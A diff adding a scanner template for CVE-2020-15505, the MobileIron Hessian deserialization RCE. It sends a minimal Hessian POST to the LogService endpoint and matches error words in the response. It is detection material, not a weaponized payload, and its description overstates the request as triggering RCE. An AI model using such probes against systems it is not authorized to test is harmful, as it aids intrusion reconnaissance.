@@ -1,0 +1,42 @@
+[info]
+author = "AVE"
+description = "通过向MobileIron Core/Connector的/mifs/services/LogService接口发送精心构造的Hessian反序列化请求，触发Java反序列化远程代码执行，验证漏洞是否存在"
+id = "POC-AVE-2020-0686"
+name = "CVE-2020-15505 MobileIron Hessian反序列化远程代码执行漏洞 PoC"
+severity = "critical"
+tags = [
+    "cve-2020-15505",
+    "mobileiron",
+    "rce",
+    "deserialization",
+]
+vuln_id = [
+    "CVE-2020-15505",
+    "AVE-2020-0686",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/mifs/services/LogService"
+protocol = "http"
+
+[poc.requests.body]
+content = "H"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-hessian"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "java",
+    "Hessian",
+    "ServiceException",
+]
